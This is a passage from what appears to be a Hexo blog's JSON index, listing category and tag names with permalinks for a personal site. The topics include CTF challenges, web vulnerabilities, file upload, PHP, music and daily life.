2021.5.9","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"}],"categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"},{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"},{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"},{"name":"CTF-Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"},{"name":"影视有感","slug":"影视有感","permalink":"https://xizhi-future.github.io/categories/%E5%BD%B1%E8%A7%86%E6%9C%89%E6%84%9F/"},{"name":"Web漏洞","slug":"Web漏洞","permalink":"https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E/"},{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"},{"name":"web","slug":"web","permalink":"https://xizhi-future.github.io/categories/web/"},{"name":"文件上传","slug":"web/文件上传","permalink":"https://xizhi-future.github.io/categories/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/categories/Web/"},{"name":"漏洞","slug":"Web/漏洞","permalink":"https://xizhi-future.github.io/categories/Web/%E6%BC%8F%E6%B4%9E/"},{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/categories/PHP/"},{"name":"博客部署","slug":"博客部署","permalink":"https://xizhi-future.github.io/categories/%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/"},{"name":"Web基础篇","slug":"Web基础篇","permalink":"https://xizhi-future.github.io/categories/Web%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"信息搜集","slug":"信息搜集","permalink":"https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"漏洞","slug":"漏洞","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"文件上传","slug":"文件上传","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"文件包含","slug":"文件包含","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/tags/PHP/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"},{"name":"博客","slug":"博客","permalink":"https://xizhi-future.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"Hexo","slug":"Hexo","permalink":"https://xizhi-future.github.io/tags/Hexo/"},{"name":"图床","slug":"图床","permalink":"https://xizhi-future.github.io/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"Web应用基本架构","slug":"Web应用基本架构","permalink":"https://xizhi-future.github.io/tags/Web%E5%BA%94%E7%94%A8%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xizhi-future.github.io/tags/HTTP/"},{"name":"会话技术","slug":"会话技术","permalink":"https://xizhi-future.github.io/tags/%E4%BC%9A%E8%AF%9D%E6%8A%80%E6%9C%AF/"}]}